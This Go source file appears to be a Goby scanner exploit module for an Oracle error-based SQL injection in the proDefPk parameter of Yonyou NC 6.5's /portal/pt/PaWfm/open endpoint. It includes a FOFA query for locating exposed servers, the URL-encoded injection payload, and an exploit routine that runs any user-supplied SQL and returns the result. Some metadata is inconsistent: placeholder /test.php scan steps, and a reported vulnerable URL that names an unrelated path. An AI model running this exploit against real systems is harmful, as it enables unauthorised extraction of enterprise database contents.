package exploits

import (
	"errors"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "YonyouNC /portal/pt/PaWfm/open File proDefPk Parameter SQL Injection Vulnerability",
    "Description": "<p>Yonyou NC is an enterprise-level ERP software. As an information management tool, Yonyou NC provides a series of business management modules, including financial accounting, procurement management, sales management, material management, production planning, and human resources management, helping enterprises achieve digital transformation and efficient management.</p><p>In version 6.5 of Yonyou NC, the /portal/pt/PaWfm/open interface has a SQL injection vulnerability in the proDefPk parameter. Attackers can exploit this vulnerability to retrieve data from the server's database, leading to information leakage.</p>",
    "Product": "yonyou-ERP-NC",
    "Homepage": "https://www.yonyou.com/",
    "DisclosureDate": "2024-05-06",
    "PostTime": "2024-05-30",
    "Author": "兰公子",
    "FofaQuery": "body=\"logo/images/ufida.ico\" || body=\"/Client/Uclient/UClient.dmg\"",
    "GobyQuery": "body=\"logo/images/ufida.ico\" || body=\"/Client/Uclient/UClient.dmg\"",
    "Level": "2",
    "Impact": "<p>In version 6.5 of Yonyou NC, the /portal/pt/PaWfm/open interface has a SQL injection vulnerability in the proDefPk parameter. Attackers can exploit this vulnerability to retrieve data from the server's database, leading to information leakage.</p>",
    "Recommendation": "<p>1. Contact the manufacturer to obtain measures for fixing the vulnerability.</p><p>2. Set up access policies through firewalls and other security devices to allow access only from whitelisted sources.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "sql,sqlPoint",
            "show": ""
        },
        {
            "name": "sql",
            "type": "input",
            "value": "SELECT+name+FROM+v$database",
            "show": "attackType=sql"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6.5",
    "Translation": {
        "CN": {
            "Name": "用友NC /portal/pt/PaWfm/open 文件 proDefPk 参数 SQL 注入漏洞",
            "Product": "用友-ERP-NC",
            "Description": "<p>用友NC是一款企业级ERP软件。作为一种信息化管理工具，用友NC提供了一系列业务管理模块，包括财务会计、采购管理、销售管理、物料管理、生产计划和人力资源管理等，帮助企业实现数字化转型和高效管理。</p><p>用友NC 6.5版本 /portal/pt/PaWfm/open 接口 proDefPk 参数 存在低sql注入漏洞，攻击者可利用此漏洞获取服务器数据库中的数据，造成信息泄露。</p>",
            "Recommendation": "<p>1、联系厂商获取修复漏洞措施</p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。&nbsp;</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>用友NC 6.5版本 /portal/pt/PaWfm/open 接口 proDefPk 参数 存在低sql注入漏洞，攻击者可利用此漏洞获取服务器数据库中的数据，造成信息泄露。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "YonyouNC /portal/pt/PaWfm/open File proDefPk Parameter SQL Injection Vulnerability",
            "Product": "yonyou-ERP-NC",
            "Description": "<p>Yonyou NC is an enterprise-level ERP software. As an information management tool, Yonyou NC provides a series of business management modules, including financial accounting, procurement management, sales management, material management, production planning, and human resources management, helping enterprises achieve digital transformation and efficient management.</p><p>In version 6.5 of Yonyou NC, the /portal/pt/PaWfm/open interface has a SQL injection vulnerability in the proDefPk parameter. Attackers can exploit this vulnerability to retrieve data from the server's database, leading to information leakage.</p>",
            "Recommendation": "<p>1. Contact the manufacturer to obtain measures for fixing the vulnerability.</p><p>2. Set up access policies through firewalls and other security devices to allow access only from whitelisted sources.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>In version 6.5 of Yonyou NC, the /portal/pt/PaWfm/open interface has a SQL injection vulnerability in the proDefPk parameter. Attackers can exploit this vulnerability to retrieve data from the server's database, leading to information leakage.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10959"
}`

	sendPayload1715asdf914613 := func(hostInfo *httpclient.FixUrl, sql string) (*httpclient.HttpResponse, error) {
		uri := `/portal/pt/PaWfm/open?pageId=login&proDefPk=1%27+AND+9919%3DUTL_INADDR.get_host_name%28%27~%27%7C%7C%28` + sql + `%29%7C%7C%27~%27%29--+rtSy`
		cfg := httpclient.NewGetRequestConfig(uri)
		cfg.VerifyTls = false
		cfg.Timeout = 15
		cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")

		resp, err := httpclient.DoHttpRequest(hostInfo, cfg)
		if err != nil {
			return nil, err
		}
		if resp.StatusCode != 500 {
			return nil, errors.New("not response 500")
		}
		if !strings.Contains(resp.Utf8Html, "line") {
			return nil, errors.New("not info")
		}
		return resp, nil

	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			sendPayload := sendPayload1715asdf914613
			feature := goutils.RandomHexString(8)
			// 默认是MySQL / MariaDB数据库 : 用DATABASE()查询数据库名，用CONCAT()拼接字符
			// PostgreSQL : 用current_database()查询数据库名，用CONCAT()拼接字符
			// SQLite : 用database_list查询数据库名，用||拼接字符
			// SQL Server : 用DB_NAME()查询数据库名，用+拼接字符
			// Oracle : 用SELECT name FROM v$database查询数据库名，用concat()拼接字符
			sql := `SELECT+'` + feature + `'||name||'` + feature + `'+FROM+v$database`

			_, err := sendPayload(hostInfo, sql)
			if err != nil {
				return false
			}
			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.FixedHostInfo + `/dashboard/pagingQueryData`
			return true
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			sendPayload := sendPayload1715asdf914613
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			sql := goutils.B2S(stepLogs.Params["sql"])
			if attackType == "sql" {
				resp, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Output = `漏洞利用失败:` + err.Error()
					expResult.Success = false
					return expResult
				}
				expResult.Output = resp.Utf8Html
				expResult.Success = true
			} else if attackType == "sqlPoint" {
				_, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Output = `漏洞利用失败:` + err.Error()
					expResult.Success = false
					return expResult
				}
				expResult.Success = true
				expResult.Output = `/portal/pt/PaWfm/open?pageId=login&proDefPk=1%27+AND+9919%3DUTL_INADDR.get_host_name%28%27~%27%7C%7C%28` + sql + `%29%7C%7C%27~%27%29--+rtSy HTTP/1.1
Host: ` + expResult.HostInfo.FixedHostInfo + `
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Connection: close`
			}
			return expResult
		},
	))
}
